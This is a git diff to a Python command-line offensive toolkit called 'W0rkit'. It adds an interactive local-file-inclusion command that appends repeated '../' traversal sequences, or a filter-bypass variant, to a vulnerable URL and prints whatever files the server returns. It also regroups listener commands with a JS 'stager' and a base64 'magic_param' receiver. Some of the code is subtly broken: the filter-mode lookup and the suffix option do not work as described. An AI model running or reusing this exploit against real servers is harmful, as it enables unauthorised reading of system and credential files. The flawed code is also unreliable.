@@ -1,11 +1,13 @@
 import click
 from colorama import Fore, Back, Style, init as colorama_init
-from flask import g
+import requests
 
 
 VERSION = "0.0.1"
 
 colorama_init(autoreset=True)
+
+lfi_modes_to_chars = {"spf": "....//", "default": "../"}
 
 
 @click.group()
@@ -13,7 +15,47 @@ def main():
     print(f"W0rkit CLI {VERSION}")
 
 
-@main.command()
+@click.group()
+def web():
+    print(f"Web Mode!")
+
+
+@main.group()
+def lfi():
+    print(f"LFI Mode!")
+
+
+@lfi.command()
+@click.option("-i", "--injectable", help="The full target where the LFI is present. (ex. http://vuln.site/?download=)", required=True)
+@click.option("--fm", "--filter-mode", help="Specify here if the target is somehow filtering injection. (Current options: 'spf')")
+@click.option("-s", "--suffix", help="Specify the suffix to be appended to the LFI payload. (e.g.: %00.pdf)", default="", type=click.types.INT)
+@click.option("--rp", "--repeat-prefix", help="Specify how many times to repeat injection characters. default = 5 (enough to traverse out of most default webroots)", default=5)
+def interrogate(injectable, filter_mode, suffix, repeat_prefix):
+    injection_char = lfi_modes_to_chars.get("default")
+    if filter_mode:
+        injection_char = lfi_modes_to_chars.get("filter_mode", None)
+    if not injection_char:
+        click.secho("Invalid filter mode, defaulting to '../'")
+        injection_char = lfi_modes_to_chars.get("default")
+
+    injection_prefix = f"{injection_char}" * repeat_prefix
+
+    try:
+        while True:
+            click.secho(f"{Fore.LIGHTYELLOW_EX}[LFI] {Fore.WHITE} Enter Filepath (from : /) {Style.RESET_ALL}", nl=False)
+            filepath = input()
+            # Prepare full url
+            target = f"{injectable}{injection_prefix}{filepath}"
+            click.secho(f"{Fore.LIGHTYELLOW_EX}[LFI] {Fore.LIGHTCYAN_EX} Trying to fetch: {Fore.LIGHTYELLOW_EX}{target}{Style.RESET_ALL}")
+            with requests.Session() as _sess:
+                resp = _sess.get(target)
+                print(resp.text)
+    except KeyboardInterrupt:
+        click.secho(f"{Fore.LIGHTRED_EX} [SYS] CTRL + C Caught, exiting!")
+        exit()
+
+
+@web.command()
 @click.option("-l", "--listen_address", help="Address the server should listen on.", required=True)
 @click.option("-p", "--listen_port", help="Port to listen on.", required=True)
 @click.option("-s", "--stager", is_flag=True, default=False, help="Enable the JS static web server")
@@ -27,7 +69,7 @@ def simple(listen_address, listen_port, stager):
     app.run(host=listen_address, port=listen_port)
 
 
-@main.command()
+@web.command()
 @click.option("-l", "--listen_address", help="Address the server should listen on.", required=True)
 @click.option("-p", "--listen_port", help="Port to listen on.", required=True)
 @click.option("-m", "--magic_param", help="The GET parameter containing your base64 data.")
